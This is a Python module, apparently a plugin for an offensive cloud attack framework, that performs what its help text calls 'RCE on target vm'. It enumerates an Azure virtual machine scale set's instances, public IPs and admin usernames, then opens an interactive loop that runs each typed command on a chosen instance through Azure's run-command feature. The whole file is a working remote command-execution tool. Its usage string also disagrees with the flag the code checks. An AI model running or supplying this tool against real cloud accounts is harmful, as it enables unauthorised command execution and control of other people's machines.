import subprocess
import json
import pprint

def start(args):

	help_str = "usage:\n\texec vmss_rce -rgrp resource-group -name vmss_name ---> will execute RCE on target vm"

	if(len(args) < 1):
		print(help_str)
		return

	if(args[0][0] == "?"):
		print(help_str)
		return
		
	if "-rgrp" not in args[0] or "-vmss_name" not in args[0]:
		print("incorrect cmd parameters")
		print(help_str)
		return

	grp_ind = args[0].index("-rgrp")
	rgrp = args[0][grp_ind+1]

	name_ind = args[0].index("-vmss_name")
	vmss_name = args[0][name_ind+1]
	
	val = subprocess.run(['az', 'vmss', 'list-instances', '--name', vmss_name, '--resource-group', rgrp, '--query', '[].{name:name, instanceId:instanceId}'], stdout=subprocess.PIPE)
	name_obj = json.loads(val.stdout.decode('utf-8'))

	val = subprocess.run(['az', 'vmss', 'list-instance-public-ips', '--name', vmss_name, '--resource-group', rgrp, '--query', '[].{ip:ipAddress}'], stdout=subprocess.PIPE)
	ip_obj = json.loads(val.stdout.decode('utf-8'))

	#pprint.pprint(json_obj)

	for i in range(len(name_obj)):
		name_obj[i].update(ip_obj[i])

	pprint.pprint(name_obj)



	instance = input("which instance? enter a valid id from the above: ")

	shell_stuff = subprocess.run(['az', 'vmss', 'show', '--name', vmss_name, '--resource-group', rgrp, '--instance-id', instance, '--query', '{whoami:osProfile.adminUsername, hostname:osProfile.computerName, os_type:storageProfile.osDisk.osType}'], stdout=subprocess.PIPE)
	shell_json_obj = json.loads(shell_stuff.stdout.decode('utf-8'))

	hostname = shell_json_obj['hostname']
	whoami = shell_json_obj['whoami']
	os_type = shell_json_obj['os_type']

	print("alright! here's a wildly shitty shell!")

	if(os_type == "Windows"):
		while(True):
			prompt = "PS "+whoami+ "> "
			cmd = input(prompt)
			if(cmd == "exit"):
				break
			val = subprocess.run(['az','vm', 'run-command', 'invoke', '-g', rgrp, '-n', vmss_name, '--command-id', 'RunPowerShellScript', '--instance-id', instance, '--scripts', cmd, '--query', 'value[].message'], stdout=subprocess.PIPE)
			val_json = json.loads(val.stdout.decode('utf-8'))
			print(val_json[0])
	else:
		while(True):
			prompt = whoami+"@"+hostname+"$ "
			cmd = input(prompt)
			if(cmd == "exit"):
				break
			val = subprocess.run(['az','vm', 'run-command', 'invoke', '-g', rgrp, '-n', vmss_name, '--command-id', 'RunShellScript', '--instance-id', instance, '--scripts', cmd, '--query', 'value[].message'], stdout=subprocess.PIPE)
			val_json = json.loads(val.stdout.decode('utf-8'))
			print(val_json[0])
		


